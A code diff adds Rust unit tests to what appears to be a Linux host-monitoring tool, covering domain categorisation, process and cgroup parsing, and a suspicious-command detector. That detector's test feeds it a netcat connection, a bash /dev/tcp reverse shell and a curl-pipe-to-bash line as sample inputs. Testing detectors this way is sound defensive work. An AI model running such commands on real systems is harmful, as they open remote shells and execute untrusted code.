@@ -1278,4 +1278,72 @@ tmpfs /mnt/should_skip tmpfs rw 0 0
         assert_eq!(m[0].fstype, "vfat");
         assert_eq!(m[1].mountpoint, "/run/media/bob/DATA");
     }
+
+    #[test]
+    fn categorize_domain_buckets() {
+        assert_eq!(categorize_domain("mail.google.com"), "webmail");
+        assert_eq!(categorize_domain("drive.google.com"), "cloud_storage");
+        assert_eq!(categorize_domain("www.dropbox.com"), "cloud_storage");
+        assert_eq!(categorize_domain("FACEBOOK.com"), "social"); // case-insensitive
+        assert_eq!(categorize_domain("github.com"), "dev");
+        assert_eq!(categorize_domain("example.com"), "web");
+    }
+
+    #[test]
+    fn is_suspicious_flags_tools_and_patterns() {
+        assert!(is_suspicious("nc", "nc 10.0.0.1 4444"));
+        assert!(is_suspicious("bash", "bash -c 'sh </dev/tcp/x/1'"));
+        assert!(is_suspicious("sh", "curl http://x | bash"));
+        assert!(!is_suspicious("ls", "ls -la"));
+        assert!(!is_suspicious("cat", "cat /etc/hostname"));
+    }
+
+    #[test]
+    fn truncate_respects_utf8_boundaries() {
+        // ASCII under limit unchanged
+        assert_eq!(truncate("abc", 10), "abc");
+        // multibyte must not panic and must stay valid UTF-8
+        let s = "héllo wörld ✓ multibyte";
+        let t = truncate(s, 7);
+        assert!(t.ends_with('…'));
+        assert!(t.is_char_boundary(t.len()));
+        // emoji (4-byte) cut point
+        let e = "🚀🚀🚀🚀🚀";
+        let _ = truncate(e, 5); // must not panic mid-codepoint
+    }
+
+    #[test]
+    fn remote_addr_helpers() {
+        assert!(is_remote("8.8.8.8:443"));
+        assert!(!is_remote("127.0.0.1:22"));
+        assert!(!is_remote("::1"));
+        assert!(!is_remote("0.0.0.0:80"));
+        assert_eq!(remote_port("1.2.3.4:443").as_deref(), Some("443"));
+        assert_eq!(remote_port("[2001:db8::1]:8080").as_deref(), Some("8080"));
+    }
+
+    #[test]
+    fn ss_process_malformed_is_safe() {
+        // garbage must not panic; yields zeros / empty
+        assert_eq!(parse_ss_process("users:((garbage"), (0, String::new()));
+        let (pid, name) = parse_ss_process(r#"users:(("sshd",pid=1,fd=3),("x",pid=2,fd=4))"#);
+        assert_eq!(pid, 1); // first owner
+        assert_eq!(name, "sshd");
+    }
+
+    #[test]
+    fn longest_hex_run_threshold() {
+        assert!(longest_hex_run("/system.slice/init.scope").is_none()); // no long hex
+        assert!(longest_hex_run("docker").is_none()); // short
+        let id = "abcdef0123456789abcdef0123456789abcd"; // 36 hex
+        assert_eq!(longest_hex_run(&format!("x-{id}.scope")).as_deref(), Some(id));
+    }
+
+    #[test]
+    fn cgroup_podman_crio_and_none() {
+        let id = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+        assert!(parse_container_from_cgroup(&format!("0::/machine.slice/libpod-{id}.scope")).starts_with("podman:"));
+        assert!(parse_container_from_cgroup(&format!("0::/system.slice/crio-{id}.scope")).starts_with("crio:"));
+        assert_eq!(parse_container_from_cgroup("0::/user.slice/user-1000.slice"), "");
+    }
 }
